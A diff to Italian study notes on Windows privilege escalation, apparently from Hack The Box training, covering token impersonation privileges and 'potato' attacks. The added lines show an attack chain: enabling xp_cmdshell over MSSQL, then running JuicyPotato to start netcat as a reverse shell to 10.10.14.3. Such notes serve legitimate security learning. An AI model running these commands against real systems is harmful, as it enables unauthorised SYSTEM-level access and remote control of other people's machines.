@@ -218,9 +218,20 @@ This post(https://blog.palantir.com/windows-privilege-abuse-auditing-detection-a
 # SeImpersonate and SeAssignPrimaryToken
 Ogni processo in windows ha un token assegnato che contiene informazioni sull' utente che l'ha runnato.
 
-Se noi riusciamo a rubare un Token di SYSTEM e abbiamo il privilegio **SeImpersonate**(spesso posseduto da utenti di servizi) possiamo creare un processo con un token (con la Win32API CreateProcessWithTokenW).
+Se noi riusciamo a rubare un Token di SYSTEM e abbiamo il privilegio **SeImpersonate**(spesso posseduto da utenti di servizi) possiamo creare un processo con un token (con la Win32API **CreateProcessWithTokenW**).
+
+**SeAssignPrimaryTokenPrivilege** serve invece per assegnare un token ad un processo . serve per eseguire **CreateProcessAsUser**
 
 Alcuni programmi legittimi fanno cio' ovvero richiedono al processo SYSTEM **WinLogon** un token di SYSTEM e impersonano system per fare azioni privilegiate.
 
 Questi sono i cosiddetti **potato style** attacks.
+
+Exploiting juicy potato con una shell su mssql usando mssqlclient.py from the Impacket toolkit.
+**-p** e' il processo da eseguire e **-a** gli argomenti:
+
+`j4k1dibe@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth`
+
+`SQL> enable_xp_cmdshell`
+
+`SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *`
 
